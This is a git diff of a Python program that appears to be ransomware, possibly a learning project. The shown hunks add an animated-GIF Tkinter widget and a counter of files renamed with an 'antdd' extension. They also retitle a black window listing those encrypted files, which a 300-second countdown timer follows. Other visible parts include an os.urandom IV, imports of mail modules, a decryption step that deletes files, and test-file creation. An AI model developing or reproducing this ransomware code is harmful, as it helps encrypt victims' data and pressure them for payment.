@@ -12,7 +12,8 @@ import poplib
 from email.mime.text import MIMEText
 
 import tkinter
-from testFile import thanos
+from tkinter.ttk import Label
+from PIL import Image, ImageTk
 
 iv = os.urandom(16)
 
@@ -102,11 +103,13 @@ def startTimer(gui, path, ext=None):
     sleep(1)
 
     antdd_filelist = []
+    n = 0
 
     for name in os.listdir(path):
         if os.path.isfile(os.path.join(path, name)):
             if name.endswith('antdd'):
                 antdd_filelist.append(name)
+                n += 1
             else:
                 continue
 
@@ -115,7 +118,7 @@ def startTimer(gui, path, ext=None):
         return
 
     gui.listWindow = tkinter.Toplevel(gui.window)
-    gui.listWindow.title('암호화된 파일 리스트(남은 파일 리스트)')
+    gui.listWindow.title('Encrypt File You Have')
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
     gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_filelist]),
@@ -125,8 +128,6 @@ def startTimer(gui, path, ext=None):
     gui.list.pack()
 
     clock(gui, 300, antdd_filelist)
-
-
 
 # 타이머를 출력해주는 함수
 def clock(gui, c, antdd_filelist):
@@ -241,7 +242,6 @@ class RealMain:
 
         self.myGui = MyTk(parent=self)  # 자기자신에 대한 레퍼런스를 가지는 gui 객체 생성
 
-
     def encListFiles(self, path):
         filelist = []
         extlist = \
@@ -328,7 +328,107 @@ class RealMain:
                         os.remove(dec_target)
                     self.myGui.finalGui()
 
+class AnimatedGIF(Label, object):
+    def __init__(self, master, path, forever=True):
+        self._master = master
+        self._loc = 0
+        self._forever = forever
+
+        self._is_running = False
+
+        im = Image.open(path)
+        self._frames = []
+        i = 0
+        try:
+            while True:
+                photoframe = ImageTk.PhotoImage(im.copy().convert('RGBA'))
+                self._frames.append(photoframe)
+
+                i += 1
+                im.seek(i)
+        except EOFError:
+            pass
+
+        self._last_index = len(self._frames) - 1
+
+        try:
+            self._delay = im.info['duration']
+        except:
+            self._delay = 100
+
+        self._callback_id = None
+
+        super(AnimatedGIF, self).__init__(master, image=self._frames[0])
+
+    def start_animation(self, frame=None):
+        if self._is_running:
+            return
+
+        if frame is not None:
+            self._loc = 0
+            self.configure(image=self._frames[frame])
+
+        self._master.after(self._delay, self._animate_GIF)
+        self._is_running = True
+
+    def stop_animation(self):
+        if not self._is_running:
+            return
+
+        if self._callback_id is not None:
+            self.after_cancel(self._callback_id)
+            self._callback_id = None
+
+        self._is_running = False
+
+    def _animate_GIF(self):
+        self._loc += 1
+        self.configure(image=self._frames[self._loc])
+
+        if self._loc == self._last_index:
+            if self._forever:
+                self._loc = 0
+                self._callback_id = self._master.after(self._delay, self._animate_GIF)
+            else:
+                self._callback_id = None
+                self._is_running = False
+        else:
+            self._callback_id = self._master.after(self._delay, self._animate_GIF)
+
+    def pack(self, start_animation=True, **kwargs):
+        if start_animation:
+            self.start_animation()
+        super(AnimatedGIF, self).pack(**kwargs)
+
+    def grid(self, start_animation=True, **kwargs):
+        if start_animation:
+            self.start_animation()
+        super(AnimatedGIF, self).grid(**kwargs)
+
+    def place(self, start_animation=True, **kwargs):
+        if start_animation:
+            self.start_animation()
+
+        super(AnimatedGIF, self).place(**kwargs)
+
+    def pack_forget(self, **kwargs):
+        self.stop_animation()
+        super(AnimatedGIF, self).pack_forget(**kwargs)
+
+    def grid_forget(self, **kwargs):
+        self.stop_animation()
+        super(AnimatedGIF, self).grid_forget(**kwargs)
+
+    def place_forget(self, **kwargs):
+        self.stop_animation()
+        super(AnimatedGIF, self).place_forget(**kwargs)
+
 if __name__ == "__main__":
+
+    #@@ 이거 진짜 지워야하는데
+    for i in range(5):
+        with open("test" + str(i) + '.txt', 'wb') as testfile:
+            testfile.write('테스트입니다'.encode())
 
     r = RealMain()
     r.run()
